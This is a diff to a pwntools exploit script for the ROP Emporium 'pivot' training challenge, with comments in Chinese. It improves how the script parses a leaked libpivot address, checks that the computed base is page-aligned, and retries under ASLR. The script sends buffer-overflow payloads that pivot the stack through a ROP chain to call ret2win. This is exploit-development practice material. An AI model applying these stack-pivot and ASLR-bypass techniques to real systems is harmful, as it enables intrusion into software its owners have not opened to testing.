@@ -76,7 +76,7 @@ def csu_call(func_got: int, arg: int = 0) -> bytes:
     )
 
 
-def pwn() -> None:
+def pwn(tries: int = 0) -> None:
     io = start()
 
     # ================= 阶段 1：leak libpivot 基址 =================
@@ -101,10 +101,27 @@ def pwn() -> None:
     io.send(b"A" * 0x28 + p64(POP_RAX) + p64(pivot) + p64(XCHG_RSP_RAX))
 
     # ================= 解析 leak =================
-    io.recvuntil(b"into libpivot\n")                     # foothold 的打印
-    raw = io.recvline().strip(b"\n")
+    # foothold_function 先打 "Thank you!\nfoothold_function(): ... into libpivot\n"，
+    # 紧跟 puts(foothold@got) 的**原始地址字节**（0x7f... 一般 6 字节，遇 \x00 截断），
+    # 之后 main 重新打印 banner "pivot by ROP Emporium"。
+    # 坑：地址字节里可能含 \n / \x00，既不能用 recvline()，也不能假设固定 6 字节，
+    # 所以读到下一个 banner 为止，再把尾部那一个 \n（puts 加的）去掉。
+    io.recvuntil(b"into libpivot\n")
+    marker = b"pivot by ROP Emporium"
+    tail = io.recvuntil(marker)
+    raw = tail[: -len(marker)]
+    if raw.endswith(b"\n"):
+        raw = raw[:-1]
     leak = u64(raw.ljust(8, b"\x00"))
     libpivot = leak - OFF_FOOTHOLD
+    if leak < 0x1000 or (libpivot & 0xFFF):
+        # puts 会在第一个 \x00 处截断：偶尔 libpivot 基址里正好有 0x00 字节，
+        # 只能收到 2~5 字节 -> 算出的基址不是页对齐。重开一局（ASLR 会变）。
+        if tries >= 5:
+            raise SystemExit("leak 连续被 \\x00 截断，放弃")
+        log.warning("leak=0x%x 被截断（基址 0x%x 非页对齐），重开一局", leak, libpivot)
+        io.close()
+        return pwn(tries + 1)
     ret2win = libpivot + OFF_RET2WIN
     log.success("foothold @ %#x -> libpivot @ %#x", leak, libpivot)
     log.success("ret2win  @ %#x", ret2win)
@@ -122,7 +139,7 @@ def pwn() -> None:
     io.recvuntil(b"> ")
     io.send(b"A" * 0x28 + p64(POP_RAX) + p64(pivot2) + p64(XCHG_RSP_RAX))
 
-    print(io.recvall(timeout=2).decode(errors="replace"))
+    print(io.recvall(timeout=5).decode(errors="replace"))
     io.close()
 
 
